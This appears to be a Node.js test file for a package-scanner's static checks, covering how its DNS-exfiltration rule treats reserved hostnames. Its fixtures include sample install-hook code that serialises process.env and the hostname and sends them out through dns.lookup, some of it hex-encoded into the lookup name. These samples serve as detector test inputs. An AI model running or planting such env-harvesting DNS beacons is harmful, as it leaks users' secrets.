// Since 0.1.8: static-checks-1.10, recon's v6.25 mirrored (S0 and S6, the DNS arm only; fix ledger RF-9, runtime U3; operator to recon
// 2026-11-12 "Yes proceed"). A node dns call is not counted when its first argument is a plain string literal (quotes or a backtick,
// followed by , or ) so nothing is joined to it) whose host is a reserved name: localhost, or a name ending in .invalid, .example, .test
// or .localhost with a label before it (RFC 2606, RFC 6761). Data joined to a reserved suffix still counts, and in a unit that sets its
// own DNS server (setServers or a Resolver) nothing is excluded. NODE_DNS_CALL, DNS_DATA, the S6 beacon branch and everything else are
// 1.9's. The hand-off is recon's constants file byte for byte (sealed recon v6.25, manifest 7e356955), with recon's 40 test vectors (r2 of the file: recon's extractor r1 kept only dnsCalls' first line).
// Written before the code.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createHash } from 'node:crypto';

const SC = () => import('../../proxy/static-checks.js');
const RAW = fs.readFileSync(new URL('../fixtures/cft018/static-checks-1.10-constants-r2.json', import.meta.url));
const K = JSON.parse(RAW.toString('utf8'));
const S0 = 'static:S0-shell-fetch-in-hook'; const S6 = 'static:S6-network-beacon-in-hook-target';
const file = (p, s) => ({ path: p, buf: Buffer.from(s) });
const walkOf = (files, notKept = []) => ({ ok: true, files, notKept });
const rowOf = (rows, gate) => rows.find((r) => r.gate === gate);
const hookMan = { name: 'h', version: '1.0.0', scripts: { postinstall: 'node install.js' } };
const code = (s) => String(s).replace(/^export /, '').replace(/\/\/[^\n]*/g, '').replace(/\s+/g, '');

test('T1 the hand-off is recon\'s file byte for byte, plain ASCII; the version, the patterns and the function texts are its', async () => {
  const S = await SC();
  assert.equal(createHash('sha256').update(RAW).digest('hex'), 'c8e08fcc5c34aa0bd7b1a4a21c60d74c86a55c751c24c6b894892308a0e303d9');
  assert.ok(RAW.every((b) => b < 0x80));
  assert.equal(S.STATIC_CHECKS_VERSION, K.static_checks_version); assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.10');
  assert.equal(S.NODE_DNS_CALL.source, K.dns.node_dns_call); assert.equal(S.DNS_DATA.source, K.dns.dns_data);
  assert.deepEqual([...S.RESERVED_DNS_SUFFIXES], K.dns.reserved_dns_suffixes);
  assert.deepEqual([...S.RESERVED_DNS_NAMES], K.dns.reserved_dns_names);
  assert.equal(S.DNS_CUSTOM_SERVER.source, K.dns.dns_custom_server); assert.equal(S.DNS_CUSTOM_SERVER.flags, '');
  assert.equal(S.DNS_LABELS.source, K.dns.dns_labels);
  assert.equal(code(S.reservedDnsName), code(K.dns.reserved_dns_name));
  assert.equal(code(`const dnsExfil = ${S.dnsExfil}`), code(K.dns.dns_exfil).replace(/;$/, ''));
  assert.equal(code(S.dnsCalls), code(K.dns.dns_calls));   // r2: the whole function (r1's extractor kept its first line only)
});

test('T2 recon\'s vectors: reservedDnsName on 16 hosts and dnsExfil on 24 units, as the sealed code answers', async () => {
  const S = await SC();
  assert.equal(K.test_vectors.reserved_dns_name.length, 16); assert.equal(K.test_vectors.dns_exfil.length, 24);
  for (const v of K.test_vectors.reserved_dns_name) assert.equal(S.reservedDnsName(v.host), v.expect, JSON.stringify(v.host));
  for (const v of K.test_vectors.dns_exfil) {
    assert.equal(S.dnsExfil(v.unit), v.expect_1_10, `${v.why}: ${v.unit}`);
    if ('was_1_9' in v) assert.equal(S.NODE_DNS_CALL.test(v.unit) && S.DNS_DATA.test(v.unit), v.was_1_9, `1.9 reading of: ${v.why}`);
  }
});

test('T3 S6 through the rows: env-harvest\'s fixed reserved name no longer fires; a name built from data on a reserved suffix still does', async () => {
  const S = await SC();
  const run = (src) => rowOf(S.staticRows({ manifest: hookMan, packageJson: hookMan, walk: walkOf([file('install.js', src)]) }), S6);
  const harvest = "const os=require('os');const dns=require('dns');const i={h:os.hostname(),e:JSON.stringify(process.env)};\n  dns.lookup('collector.scml-lab.invalid', () => {});\n";
  assert.equal(run(harvest).result, 'ALLOW', run(harvest).detail);
  const joined = "const dns=require('dns');const d=Buffer.from(JSON.stringify(process.env)).toString('hex').slice(0,60);\n  dns.lookup(d + '.x.example.invalid', () => {});\n";
  assert.equal(run(joined).result, 'WARN'); assert.match(run(joined).detail, /makes a DNS lookup carrying process or host data/);
  const own = "const dns=require('dns');dns.setServers(['198.51.100.7']);const h=require('os').hostname();\n  dns.lookup('probe.invalid', () => {});\n";
  assert.equal(run(own).result, 'WARN', 'a unit with its own DNS server excludes nothing');
});

test('T4 S0 through a hook command: the same exclusion in inline node code', async () => {
  const S = await SC();
  const fixed = "node -e \"require('dns').lookup('beacon.test', () => {}); process.env.HOME\"";
  const joined = "node -e \"require('dns').lookup(process.env.USER + '.x.test', () => {})\"";
  assert.equal(S.hookFetchExec(fixed).dns_exfil, false); assert.equal(S.hookFetchExec(joined).dns_exfil, true);
});

test('T5 S7 still compares entry facts stored by 1.8, 1.8.1 and 1.9 (1.10 changes no fact)', async () => {
  const S = await SC();
  assert.deepEqual([...S.S7_COMPARABLE_VERSIONS], ['static-checks-1.8', 'static-checks-1.8.1', 'static-checks-1.9', 'static-checks-1.10']);
});
